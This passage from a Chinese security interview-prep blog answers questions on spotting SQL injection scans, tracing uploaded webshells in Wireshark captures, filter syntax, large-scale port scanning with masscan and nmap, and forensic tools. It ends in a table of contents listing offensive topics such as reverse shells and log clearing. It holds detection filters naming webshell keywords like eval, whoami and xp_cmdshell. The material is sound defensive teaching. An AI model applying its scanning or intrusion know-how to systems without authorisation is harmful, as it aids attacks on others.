<h2 id="假设发现数据库短时间内查询异常次数增多，描述-sql-查询异常流量分析的思路"><a href="#假设发现数据库短时间内查询异常次数增多，描述-sql-查询异常流量分析的思路" class="headerlink" title="假设发现数据库短时间内查询异常次数增多，描述 sql 查询异常流量分析的思路"></a>假设发现数据库短时间内查询异常次数增多，描述 sql 查询异常流量分析的思路</h2><p>数据库短时间内查询增多有可能遭遇到了扫描或者 sql 注入测试，可以结合流量分析工具进行研判。<br>select 和 union 为数据库查询语句特征，当这两者数量出现次数较多而且差异较小可能存在 SQL 注入漏洞或正在被扫描器扫描，可监控这两个关键字，但还需要进一步查看具体请求参数。如：<br>1）使用 wireshark 打开抓取后的流量包<br>2）对于抓取到的数据包筛选出 HTTP 协议包，在统计处筛选出短时间内流量较大的 IP</p>
<h2 id="描述流量分析溯源的思路"><a href="#描述流量分析溯源的思路" class="headerlink" title="描述流量分析溯源的思路"></a>描述流量分析溯源的思路</h2><p>假设发现 web 应用服务器发现文件异常增多，初步怀疑被上传 webshell，描述流量分析溯源的思路<br>可利用流量工具进行溯源：<br>1）查看 eval、z0、shell、whoami 等关键字，查看出现次数过多的时候，可能需要查看是哪个页面发起的请求，有可能是 webshell<br>2）通过 WireShark 工具快速搜索关键字，定位到异常流量包<br>3）找出异常 IP 和所上传的内容，查看是否为 webshell</p>
<p>如何定位到攻击 IP：<br>1）首先通过选择-统计-对话查看流量的走向情况，定位可疑的 IP 地址<br>2）根据定位到的 IP 地址，尝试对上传的 webshell 进行定位 ip.addr &#x3D;&#x3D; ip &amp;&amp; http matches “upload||eval|select|xp_cmdshell” &amp;&amp; http.request.method &#x3D;&#x3D; “POST”<br>3）查找到 Webshell 后尝试溯源漏洞位置，http.request.uri contains “webshell.php”，定位到最开始 webshell 执行或上传的时候<br>4）根据最开始的 HTTP 上传包或者其他漏洞特产定位漏洞类型</p>
<h2 id="wireshark-简单的过滤规则"><a href="#wireshark-简单的过滤规则" class="headerlink" title="wireshark 简单的过滤规则"></a>wireshark 简单的过滤规则</h2><p>过滤 ip：过滤源 ip 地址：ip.src&#x3D;&#x3D;1.1.1.1；目的 ip 地址：ip.dst&#x3D;&#x3D;1.1.1.1；<br>过滤端口：过滤 80 端口 tcp.port&#x3D;&#x3D;80，源端口：tcp.srcport&#x3D;&#x3D;80，目的端口：tcp.dstport&#x3D;&#x3D;80<br>协议过滤：直接输入协议名即可，如 http 协议 http<br>http 模式过滤：过滤 get&#x2F;post 包 http.request.method&#x3D;&#x3D;”GET&#x2F;POST”</p>
<h2 id="客户给到你有-50-万个-ip，要求你两周内做完全端口扫描，你会怎么做"><a href="#客户给到你有-50-万个-ip，要求你两周内做完全端口扫描，你会怎么做" class="headerlink" title="客户给到你有 50 万个 ip，要求你两周内做完全端口扫描，你会怎么做"></a>客户给到你有 50 万个 ip，要求你两周内做完全端口扫描，你会怎么做</h2><p>从两方面回答：<br>1）如何对客户要求做出解释并合理调整<br>2）如何提高全端口扫描效率，既保证速度，又保证准确率。</p>
<p>首先客户提出两周 50w 个 ip 全端口这个肯定不现实，所以要考虑跟客户解释，有必要对扫描任务进行时间调整，安排尽可能多的扫描资源，如扫描机器，扫描网络带宽等，参考扫描 100 个 IP 端口的平均时长，估计扫完的时间，给出 30 天时间左右答复，并且留出一周进行后续补扫，文档整理等。<br>使用到多线程、分布式和高并发，采用 masscan + nmap，先 masscan 存活过一遍，把未存活 IP 剔除掉；使用分布式 nmap 高并发发过一遍端口，也可以 masscan 端口扫描过一遍，在 nmap 进行探测<br>由于 IP 数量过多，不能直接把所有的 IP 都丢上去扫，时间肯定不够可以跟客户商量减少 IP 数量，对未存活的 IP 进行筛选过滤，加快扫描速度需要进行参数微调，如 –min-hostgroup、–min-rate 和 –min-parallelism。对于存在防火墙的情况，可以提出需要提供扫描器<br>数据整理：对于大量的 list 和 json 使用 python-nmap python-masscan，扫描 1 个 IP 处理 1 个 IP</p>
<h2 id="常见的取证分析工具"><a href="#常见的取证分析工具" class="headerlink" title="常见的取证分析工具"></a>常见的取证分析工具</h2><p>Wireshark、xplico、Volatility、FastIR Collector、Autopsy、DumpIt、FTK Imager、Foremost、Scalpel、Bulk_extractor 等。</p>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/idea/">Idea</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie-%E5%92%8C-session-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.</span> <span class="toc-text">cookie 和 session 的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GET-%E5%92%8C-POST-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.</span> <span class="toc-text">GET 和 POST 的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OSI-%E7%9A%84%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">3.</span> <span class="toc-text">OSI 的七层模型都有哪些</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E4%B8%BE%E4%BE%8B"><span class="toc-number">4.</span> <span class="toc-text">条件竞争漏洞原理与举例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E6%94%BB%E5%87%BB%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E9%98%B2%E6%8A%A4"><span class="toc-number">5.</span> <span class="toc-text">XSS 攻击如何进行防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E8%AF%A5%E5%A6%82%E4%BD%95%E9%98%B2%E8%8C%83-CSRF-%E6%94%BB%E5%87%BB"><span class="toc-number">6.</span> <span class="toc-text">应该如何防范 CSRF 攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%AA%81%E7%A0%B4%E6%B3%A8%E5%85%A5%E6%97%B6%E5%AD%97%E7%AC%A6%E8%A2%AB%E8%BD%AC%E4%B9%89"><span class="toc-number">7.</span> <span class="toc-text">如何突破注入时字符被转义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8PHP%E3%80%81Java%E5%92%8CPython%E4%B8%AD%EF%BC%8C%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E3%80%81%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%92%8C%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">8.</span> <span class="toc-text">在PHP、Java和Python中，执行代码、读取文件和执行命令的相关函数如下：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP"><span class="toc-number">8.1.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java"><span class="toc-number">8.2.</span> <span class="toc-text">Java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python"><span class="toc-number">8.3.</span> <span class="toc-text">Python</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E6%80%8E%E4%B9%88%E7%9B%B2%E6%B3%A8"><span class="toc-number">9.</span> <span class="toc-text">盲注是什么，怎么盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0"><span class="toc-number">10.</span> <span class="toc-text">宽字节注入产生原理以及根本原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql-%E7%9A%84%E7%BD%91%E7%AB%99%E6%B3%A8%E5%85%A5-5-0-%E4%BB%A5%E4%B8%8A%E5%92%8C-5-0-%E4%BB%A5%E4%B8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB"><span class="toc-number">11.</span> <span class="toc-text">mysql 的网站注入 5.0 以上和 5.0 以下有什么区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95"><span class="toc-number">12.</span> <span class="toc-text">SSRF 漏洞的验证方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%88%90%E5%9B%A0%E3%80%81%E9%98%B2%E5%BE%A1%E3%80%81%E7%BB%95%E8%BF%87"><span class="toc-number">13.</span> <span class="toc-text">SSRF 漏洞的成因、防御、绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">14.</span> <span class="toc-text">导致文件包含的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-1"><span class="toc-number">14.0.1.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSP-Servlet"><span class="toc-number">14.0.2.</span> <span class="toc-text">JSP&#x2F;Servlet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ASP"><span class="toc-number">14.0.3.</span> <span class="toc-text">ASP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">15.</span> <span class="toc-text">文件上传漏洞绕过方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">16.</span> <span class="toc-text">文件上传防御方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="toc-number">17.</span> <span class="toc-text">Sqlmap常用参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">18.</span> <span class="toc-text">XXE 漏洞原理与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">18.0.1.</span> <span class="toc-text">1. 文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-number">18.0.2.</span> <span class="toc-text">2. 内网探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DoS%EF%BC%89"><span class="toc-number">18.0.3.</span> <span class="toc-text">3. 拒绝服务攻击（DoS）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">18.1.</span> <span class="toc-text">防御措施</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%A6%81%E7%94%A8DTD"><span class="toc-number">18.1.1.</span> <span class="toc-text">1. 禁用DTD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%A6%81%E6%AD%A2%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E8%A7%A3%E6%9E%90"><span class="toc-number">18.1.2.</span> <span class="toc-text">2. 禁止外部实体解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%80%9A%E8%BF%87%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4%E7%94%A8%E6%88%B7%E6%8F%90%E4%BA%A4%E7%9A%84XML%E6%95%B0%E6%8D%AE"><span class="toc-number">18.1.3.</span> <span class="toc-text">3. 通过黑名单过滤用户提交的XML数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">19.</span> <span class="toc-text">任意文件下载漏洞的修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-%E6%94%BB%E5%87%BB%E5%92%8C-XSS-%E6%94%BB%E5%87%BB%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB"><span class="toc-number">20.</span> <span class="toc-text">CSRF 攻击和 XSS 攻击有什么区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0-demo-jsp-uid-110-%E6%B3%A8%E5%85%A5%E7%82%B9%EF%BC%8C%E4%BD%A0%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E6%80%9D%E8%B7%AF%E8%8E%B7%E5%8F%96-webshell%EF%BC%8C%E5%93%AA%E7%A7%8D%E6%98%AF%E4%BC%98%E9%80%89"><span class="toc-number">21.</span> <span class="toc-text">发现 demo.jsp?uid&#x3D;110 注入点，你有哪几种思路获取 webshell，哪种是优选</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-MySQL-JSP%EF%BC%9A%E5%86%99%E5%85%A5-WebShell"><span class="toc-number">21.1.</span> <span class="toc-text">(1) MySQL+JSP：写入 WebShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-MySQL-Tomcat%EF%BC%9A%E5%86%99%E5%85%A5-WAR-WebShell"><span class="toc-number">21.2.</span> <span class="toc-text">(2) MySQL+Tomcat：写入 WAR WebShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%80%9A%E8%BF%87-Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Getshell"><span class="toc-number">21.3.</span> <span class="toc-text">5. 通过 Java 反序列化漏洞 Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-Java-WebShell-%E6%8C%81%E4%B9%85%E5%8C%96%E6%96%B9%E5%BC%8F"><span class="toc-number">21.4.</span> <span class="toc-text">6. Java WebShell 持久化方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B4%E5%87%BA%E8%87%B3%E5%B0%91%E4%B8%89%E7%A7%8D%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">22.</span> <span class="toc-text">说出至少三种业务逻辑漏洞，以及修复方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap-%E6%80%8E%E4%B9%88%E5%AF%B9%E4%B8%80%E4%B8%AA%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B3%A8%E5%85%A5"><span class="toc-number">23.</span> <span class="toc-text">sqlmap 怎么对一个注入点注入**</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E6%9D%A5%E5%88%A4%E6%96%AD"><span class="toc-number">24.</span> <span class="toc-text">延时注入如何来判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OWASP-%E6%BC%8F%E6%B4%9E%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">25.</span> <span class="toc-text">OWASP 漏洞都有哪些**</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E9%87%8C%E9%9D%A2%E5%8F%AA%E6%9C%89-update-%E6%80%8E%E4%B9%88%E5%88%A9%E7%94%A8"><span class="toc-number">26.</span> <span class="toc-text">SQL 里面只有 update 怎么利用**</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%A7%A3%EF%BC%9A"><span class="toc-number">26.1.</span> <span class="toc-text">讲解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-%E5%9E%8B%E5%92%8C-XSS-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E6%88%96%E4%BA%BA%E5%B7%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">27.</span> <span class="toc-text">DOM 型和 XSS 自动化测试或人工测试**</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E-XSS-%E6%80%8E%E4%B9%88%E4%BF%AE%E8%A1%A5%E5%BB%BA%E8%AE%AE"><span class="toc-number">28.</span> <span class="toc-text">对于 XSS 怎么修补建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">29.</span> <span class="toc-text">CSRF 的防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#token-%E5%92%8C-referer-%E5%81%9A%E6%A8%AA%E5%90%91%E5%AF%B9%E6%AF%94%EF%BC%8C%E8%B0%81%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7%E9%AB%98"><span class="toc-number">30.</span> <span class="toc-text">token 和 referer 做横向对比，谁安全等级高</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9-referer-%E7%9A%84%E9%AA%8C%E8%AF%81%EF%BC%8C%E4%BB%8E%E4%BB%80%E4%B9%88%E8%A7%92%E5%BA%A6%E5%8E%BB%E5%81%9A%EF%BC%9F%E5%A6%82%E6%9E%9C%E5%81%9A%EF%BC%8C%E6%80%8E%E4%B9%88%E6%9D%9C%E7%BB%9D%E9%97%AE%E9%A2%98"><span class="toc-number">31.</span> <span class="toc-text">对 referer 的验证，从什么角度去做？如果做，怎么杜绝问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-token-%E6%94%BB%E5%87%BB%EF%BC%8C%E4%BD%A0%E4%BC%9A%E5%AF%B9-token-%E7%9A%84%E5%93%AA%E6%96%B9%E9%9D%A2%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95"><span class="toc-number">32.</span> <span class="toc-text">针对 token 攻击，你会对 token 的哪方面进行测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0%E4%BD%A0%E7%9F%A5%E9%81%93%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">33.</span> <span class="toc-text">简述你知道的一句话木马**</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%E6%B8%97%E9%80%8F%E6%97%B6%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E4%BA%86-21-80-445-3306-11211-%E7%AB%AF%E5%8F%A3%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">34.</span> <span class="toc-text">假设渗透时发现服务器开了 21, 80, 445, 3306, 11211 端口，你有什么渗透思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%E6%B8%97%E9%80%8F%E6%97%B6%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%80%E6%94%BE%E4%BA%86-22%E3%80%818088%E3%80%818161%E3%80%816379-%E7%AB%AF%E5%8F%A3%EF%BC%8C%E4%BD%A0%E6%9C%89%E4%BB%80%E4%B9%88%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF"><span class="toc-number">35.</span> <span class="toc-text">假设渗透时发现服务器开放了 22、8088、8161、6379 端口，你有什么渗透思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">36.</span> <span class="toc-text">渗透测试流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5-Linux-%E5%90%8E%E9%9C%80%E8%A6%81%E6%B8%85%E9%99%A4%E5%93%AA%E4%BA%9B%E6%97%A5%E5%BF%97"><span class="toc-number">37.</span> <span class="toc-text">入侵 Linux 后需要清除哪些日志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">38.</span> <span class="toc-text">域内横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E3%80%81linux-%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">39.</span> <span class="toc-text">Windows、linux 反弹 shell 的方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%90%9C%E9%9B%86%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">40.</span> <span class="toc-text">子域名搜集的方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oneforall-%E6%90%9C%E7%B4%A2%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">41.</span> <span class="toc-text">Oneforall 搜索的原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E4%B8%80%E4%B8%AA%E5%BE%85%E6%A3%80%E6%B5%8B%E7%9A%84%E7%AB%99%EF%BC%8C%E4%BD%A0%E8%A7%89%E5%BE%97%E5%BA%94%E8%AF%A5%E5%85%88%E5%81%9A%E4%BB%80%E4%B9%88"><span class="toc-number">42.</span> <span class="toc-text">拿到一个待检测的站，你觉得应该先做什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="toc-number">43.</span> <span class="toc-text">渗透测试中常见的端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12%E3%80%81%E7%AE%80%E8%BF%B0-nmap-%E5%8F%82%E6%95%B0%E5%92%8C%E4%B8%8D%E5%90%8C%E6%96%B9%E6%B3%95%E6%89%AB%E6%8F%8F%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">44.</span> <span class="toc-text">12、简述 nmap 参数和不同方法扫描的优缺点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0-Windows-%E5%8F%8A-linux-%E5%B9%B3%E5%8F%B0%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95"><span class="toc-number">45.</span> <span class="toc-text">简述 Windows 及 linux 平台提权方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E8%BF%B0-linux-%E7%B3%BB%E7%BB%9F%E4%B8%AD%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97%E6%96%B9%E6%B3%95"><span class="toc-number">46.</span> <span class="toc-text">简述 linux 系统中查询日志方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0%E4%B8%80%E4%B8%8B-DeDecms-%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">47.</span> <span class="toc-text">描述一下 DeDecms 任意密码重置漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8"><span class="toc-number">48.</span> <span class="toc-text">常见的网站服务器容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B-iis-%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%BC%8F%E6%B4%9E"><span class="toc-number">49.</span> <span class="toc-text">如何检测 iis 短文件名漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E5%88%AB-web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF-windows-%E8%BF%98%E6%98%AF-linux"><span class="toc-number">50.</span> <span class="toc-text">如何判别 web 服务器是 windows 还是 linux</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">51.</span> <span class="toc-text">Tomcat 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-%E5%90%8E%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81"><span class="toc-number">52.</span> <span class="toc-text">Weblogic 后台默认密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Weblogic-%E7%9A%84-CVE-2019-2725-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%E4%B8%8E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">53.</span> <span class="toc-text">Weblogic 的 CVE-2019-2725 漏洞描述与修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%E7%8E%B0-weblogic-%E7%88%86%E5%8F%91-0day-%E6%BC%8F%E6%B4%9E%EF%BC%8C%E9%9C%80%E8%A6%81%E4%BD%A0%E7%B4%A7%E6%80%A5%E6%8E%92%E6%9F%A5%E5%BD%B1%E5%93%8D%EF%BC%8C%E8%AF%B4%E8%AF%B4%E4%BD%A0%E7%9A%84%E7%9C%8B%E6%B3%95%EF%BC%9F"><span class="toc-number">54.</span> <span class="toc-text">假设现 weblogic 爆发 0day 漏洞，需要你紧急排查影响，说说你的看法？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">55.</span> <span class="toc-text">常见中间件的配置文件路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Struts2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">56.</span> <span class="toc-text">Struts2 反序列化漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zookeeper-%E9%BB%98%E8%AE%A4%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="toc-number">57.</span> <span class="toc-text">Zookeeper 默认的端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9A%84%E6%A3%80%E6%9F%A5%E6%96%B9%E6%B3%95"><span class="toc-number">58.</span> <span class="toc-text">Zookeeper 未授权访问的检查方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E5%88%97%E5%87%BA-Zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">59.</span> <span class="toc-text">请列出 Zookeeper 未授权访问漏洞的修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%A3%80%E6%9F%A5-mongodb-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">60.</span> <span class="toc-text">如何检查 mongodb 未授权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-number">61.</span> <span class="toc-text">Redis 未授权漏洞产生原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 